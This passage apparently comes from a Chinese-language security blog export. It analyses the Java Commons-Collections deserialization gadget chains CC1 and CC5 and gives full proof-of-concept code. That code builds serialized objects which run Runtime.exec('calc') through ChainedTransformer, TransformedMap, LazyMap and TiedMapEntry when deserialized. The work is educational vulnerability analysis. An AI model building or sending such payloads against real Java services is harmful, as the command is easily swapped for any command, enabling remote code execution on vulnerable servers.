Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了readobject下调用了setvalue</p>
<p>由于memberValues可控，这样我们就可以传入自己需要的，然后实现setValue方法</p>
<p>但是这个类没有说明是不是public之类的，也就是我们只能在包里面进行diaoyong，要想在外部调用的话就必须使用反射</p>
<p>copy的粗略的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定参数类型的构造函数Constructor对象，这里我们能获取到估计就是它的那个构造函数</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// 相当于提升自己权限，以便可以访问非公共构造函数</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里第一个是参数是注解的类原型，第二个就是我们之前的类</span></span><br><span class="line"><span class="comment">// 使用newInstance()方法创建一个新的AnnotationInvocationHandler实例</span></span><br><span class="line"><span class="comment">// 传递Override.class和decorate两个参数给构造函数</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line">serialize(o);  <span class="comment">//序列化</span></span><br><span class="line">unserialize(<span class="string">&quot;CC1.txt&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义序列化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC1.txt&quot;</span>));</span><br><span class="line">   oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义反序列化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">   ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">   objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现没有弹出计算器</p>
<h1 id="解决三个问题"><a href="#解决三个问题" class="headerlink" title="解决三个问题"></a>解决三个问题</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Runtime是没有实现Serializable接口的，无法序列化</span><br><span class="line">2. AnnotationInvocationHandler中的readObject执行 memberValue.setValue需要绕过两if判断</span><br><span class="line">3. memberValue.setValue中的值无法控制</span><br></pre></td></tr></table></figure>

<h3 id="Runtime是没有实现Serializable接口的，无法序列化"><a href="#Runtime是没有实现Serializable接口的，无法序列化" class="headerlink" title="Runtime是没有实现Serializable接口的，无法序列化"></a>Runtime是没有实现Serializable接口的，无法序列化</h3><p>虽然Runtime是没有实现Serializable接口的，可以运用反射来获取它的原型类，它的原型类Class是存在serializable接口，可以序列化的</p>
<p>改成下面这种形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//获取类原型</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//获取getRuntime方法，</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//获取exec方法</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>);                                         <span class="comment">//实现命令执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>改成这样也是可以执行命令的；但是问题又来了，上面一共执行了三次<code>transform</code>方法。但是<code>InvokerTransformer</code>类中只能执行一次<code>transform</code>方法；</p>
<p>这里又要介绍一个需要利用的类<code>ChainedTransformer</code>;可以看一下此类的构造方法和<code>transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传递一个transformers方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一个for循环，将上一个对象当作下一个函数执行，循环嵌套</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们利用chainedTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">     <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);  <span class="comment">//获取原型类</span></span><br><span class="line">     Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="comment">//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。</span></span><br><span class="line">     ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">     chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样可以运行</p>
<h3 id="解决setValue-方法无法执行的原因"><a href="#解决setValue-方法无法执行的原因" class="headerlink" title="解决setValue()方法无法执行的原因"></a><strong>解决setValue()方法无法执行的原因</strong></h3><p>setValue()方法是在两个if语句下边</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/e333e860070dd6d46ab0d3bfcd2a90f.png"></p>
<p>所以我们需要绕过这两个if语句才能执行</p>
<p>第一个if就是判断类型要不为空</p>
<p>第二个if</p>
<p>memberType.isInstance(value) || value instanceof ExceptionProxy：表示 value 是 memberType 类型的实例，或者是 ExceptionProxy 类型。</p>
<p>!()：对整个条件取反。，如果 value 既不是 memberType 的实例，也不是 ExceptionProxy，条件为真，进入 if 块。</p>
<h3 id="解决无法控制setValue值的问题"><a href="#解决无法控制setValue值的问题" class="headerlink" title="解决无法控制setValue值的问题"></a><strong><strong>解决无法控制setValue值的问题</strong></strong></h3><p>处理完if发现传进去的参数我们不可控</p>
<p>这里需要借助另一个类ConstantTransformer；这个类非常有意思，构造方法传递什么值，transform就返回什么值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>cc5</title>
    <url>/2025/03/27/cc5/</url>
    <content><![CDATA[<p>之前分析过了cc6 cc5只不过和cc6链子入口点不一样</p>
<p>先总结下cc6</p>
<h4 id="1-造炸弹：组装恶意代码链条"><a href="#1-造炸弹：组装恶意代码链条" class="headerlink" title="1. 造炸弹：组装恶意代码链条"></a><strong>1. 造炸弹：组装恶意代码链条</strong></h4><p><strong>核心武器</strong>：<code>ChainedTransformer</code>（链条转换器）</p>
<p>通过反射调用<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，相当于把弹计算器的指令拆成四步：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// 拿到Runtime类  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// 获取getRuntime方法  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// 执行getRuntime()得到实例  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// 调用exec弹计算器  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>

<p><strong>作用</strong>：这四步像流水线一样串联，最终执行命令</p>
<h3 id="大白话解释CC6链的触发流程"><a href="#大白话解释CC6链的触发流程" class="headerlink" title="大白话解释CC6链的触发流程"></a>大白话解释CC6链的触发流程</h3><p>CC6链就像在<strong>快递包裹里藏了一个全自动炸弹</strong>，当目标服务器拆开包裹（反序列化数据）时，会触发一系列连锁反应，最终执行恶意命令（如弹计算器）。以下是通俗拆解：</p>
<hr>
<h4 id="1-造炸弹：组装恶意代码链条-1"><a href="#1-造炸弹：组装恶意代码链条-1" class="headerlink" title="1. 造炸弹：组装恶意代码链条"></a><strong>1. 造炸弹：组装恶意代码链条</strong></h4><p>- </p>
<p>  核心武器</p>
<p>  ：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ChainedTransformer</span><br></pre></td></tr></table></figure>

<p>  （链条转换器）</p>
<ul>
<li><p>通过反射调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<p>相当于把弹计算器的指令拆成四步：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// 拿到Runtime类  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// 获取getRuntime方法  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// 执行getRuntime()得到实例  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// 调用exec弹计算器  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>作用</strong>：这四步像流水线一样串联，最终执行命令。</p>
</li>
</ul>
<hr>
<h4 id="2-伪装炸弹：LazyMap的“懒加载”特性"><a href="#2-伪装炸弹：LazyMap的“懒加载”特性" class="headerlink" title="2. 伪装炸弹：LazyMap的“懒加载”特性"></a><strong>2. 伪装炸弹：LazyMap的“懒加载”特性</strong></h4><p><strong>机关设置</strong>：<code>LazyMap</code>（懒加载地图）</p>
<ul>
<li>当调用<code>LazyMap.get(&quot;不存在的key&quot;)</code>时，如果<code>key</code>不存在，就会触发预设的恶意链条（<code>ChainedTransformer</code>）。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);  </span><br></pre></td></tr></table></figure>

<p><strong>问题</strong>：直接调用<code>get</code>会提前触发炸弹，需后续绕过</p>
<h4 id="3-设置触发开关：TiedMapEntry的hashCode"><a href="#3-设置触发开关：TiedMapEntry的hashCode" class="headerlink" title="3. 设置触发开关：TiedMapEntry的hashCode"></a><strong>3. 设置触发开关：TiedMapEntry的hashCode</strong></h4><p><strong>关键跳板</strong>：<code>TiedMapEntry</code>（绑定地图的入口）</p>
<p>把<code>LazyMap</code>和一个假<code>key</code>（如<code>&quot;fakeKey&quot;</code>）绑定到<code>TiedMapEntry</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;fakeKey&quot;</span>);  </span><br></pre></td></tr></table></figure>

<p><strong>触发逻辑</strong>：</p>
<ul>
<li>当调用<code>entry.hashCode()</code>时，内部会执行<code>getValue()</code> → <code>lazyMap.get(&quot;fakeKey&quot;)</code> → 触发炸弹。</li>
</ul>
<h4 id="4-绕过提前爆炸：反射修改LazyMap的工厂"><a href="#4-绕过提前爆炸：反射修改LazyMap的工厂" class="headerlink" title="4. 绕过提前爆炸：反射修改LazyMap的工厂"></a><strong>4. 绕过提前爆炸：反射修改LazyMap的工厂</strong></h4><p><strong>坑点</strong>：初始化<code>LazyMap</code>时若直接绑定恶意链条，测试时会提前弹计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先用无害的Transformer初始化  </span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line"><span class="comment">// 反射偷偷替换成恶意链条  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMap.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap, chain);  </span><br></pre></td></tr></table></figure>

<p>确保炸弹只在反序列化时引爆</p>
<h4 id="5-自动引爆：HashMap的反序列化机制"><a href="#5-自动引爆：HashMap的反序列化机制" class="headerlink" title="5. 自动引爆：HashMap的反序列化机制"></a><strong>5. 自动引爆：HashMap的反序列化机制</strong></h4><p><strong>最终机关</strong>：<code>HashMap</code>的<code>readObject</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">map.put(entry, <span class="string">&quot;任意值&quot;</span>);  </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>CC6是利用<code>TiedMapEntry</code>中的<code>hashCode</code>函数；CC5是利用<code>TiedMapEntry</code>中的<code>toString</code>函数;为什么还可以利用<code>toString</code>方法；其实也就是因为<code>toString</code>也调用了调用了<code>getValue</code>方法的原因</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>BadAttributeValueExpException</code>这个类的readObject调用<code>valObj.toString()</code>,<code>valObj</code>的值是可控的；尽管<code>BadAttributeValueExpException</code>没有实现 <code>Serializable</code> 接口的情况下,任然可以序列化</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span 